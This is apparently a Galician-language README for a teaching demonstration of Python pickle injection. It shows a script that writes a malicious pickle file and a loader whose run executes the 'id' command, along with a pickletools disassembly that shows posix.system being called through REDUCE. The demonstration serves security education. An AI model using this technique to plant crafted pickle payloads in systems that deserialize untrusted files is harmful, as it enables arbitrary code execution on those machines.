# Pickle injection

Estes exemplos permiten comprobar como se pode executar código cando cargamos un
ficheiro con pickle.

Podemos xerar un ficheiro malicioso con `create-pickle-person.py` e cargalo con
`load-pickle.py` (o mesmo aplica para os ficheiros jsonpickle).

Aquí vai un exemplo:
```
$ python3 create-pickle-rce.py 
Saved in rce.pickle

$ python3 load-pickle.py rce.pickle
uid=1000(user) gid=1000(user) groups=1000(user),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),100(users),106(netdev),111(bluetooth),113(lpadmin),116(scanner)
0
```

Tamén podemos ver as operacións contidas no ficheiro pickle con pickletools:
```
$ python3 -m pickletools rce.pickle 
    0: \x80 PROTO      4
    2: \x95 FRAME      29
   11: \x8c SHORT_BINUNICODE 'posix'
   18: \x94 MEMOIZE    (as 0)
   19: \x8c SHORT_BINUNICODE 'system'
   27: \x94 MEMOIZE    (as 1)
   28: \x93 STACK_GLOBAL
   29: \x94 MEMOIZE    (as 2)
   30: \x8c SHORT_BINUNICODE 'id'
   34: \x94 MEMOIZE    (as 3)
   35: \x85 TUPLE1
   36: \x94 MEMOIZE    (as 4)
   37: R    REDUCE
   38: \x94 MEMOIZE    (as 5)
   39: .    STOP
highest protocol among opcodes = 4
```
